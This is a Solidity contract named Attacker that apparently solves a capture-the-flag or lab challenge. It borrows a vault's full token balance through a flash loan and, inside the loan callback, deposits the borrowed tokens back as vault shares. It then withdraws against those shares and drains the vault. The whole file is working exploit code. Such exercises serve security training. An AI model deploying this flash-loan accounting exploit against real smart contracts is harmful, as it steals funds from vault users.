// SPDX-License-Identifier:  None
pragma solidity 0.8.20;

import "./Vault.sol";
import "./Token.sol";

contract Attacker {
    Vault vault;
    Token token;

    constructor(address vault_address, address token_address) {
        vault = Vault(vault_address);
        token = Token(token_address);
    }

    function attack() public {
        uint256 value = token.balanceOf(address(vault));
        vault.flashLoan(value);
        vault.withdraw(vault.balanceOf(address(this)));
    }

    function onFlashLoan(address caller, uint256 amount) external {
        require(caller == address(vault));
        token.approve(address(vault), amount);
        vault.deposit(amount);
    }
}
